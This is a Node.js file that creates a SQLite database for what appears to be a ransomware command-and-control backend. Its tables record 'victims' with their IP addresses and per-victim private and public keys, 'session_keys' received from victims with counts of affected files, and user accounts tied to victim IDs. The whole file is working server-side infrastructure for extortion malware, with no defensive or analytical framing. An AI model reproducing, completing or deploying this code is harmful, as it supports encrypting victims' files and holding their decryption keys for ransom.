import sqlite3 from 'sqlite3';
import fs from 'fs';
import path from 'path';

const dataDir = path.resolve(process.cwd(), 'data');
const dbFile = path.join(dataDir, 'backend.sqlite');

// Ensure directory exists
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

const db = new sqlite3.Database(dbFile);

export const initDatabase = () => {
    db.serialize(() => {
        // 1. Victims Table
        db.run(`CREATE TABLE IF NOT EXISTS victims (
            client_id TEXT PRIMARY KEY,
            created_at TEXT,
            ip TEXT,
            private_key TEXT,
            public_key TEXT
        )`);

        // 2. Session Keys Table
        db.run(`CREATE TABLE IF NOT EXISTS session_keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT,
            key TEXT,
            files_count INTEGER,
            received_at TEXT,
            ip TEXT
        )`);

        // 3. Users Table (NEW for Auth)
        db.run(`CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password_hash TEXT,
            salt TEXT,
            client_id TEXT
        )`);
    });
    console.log('[Database] Initialized at', dbFile);
};

export default db;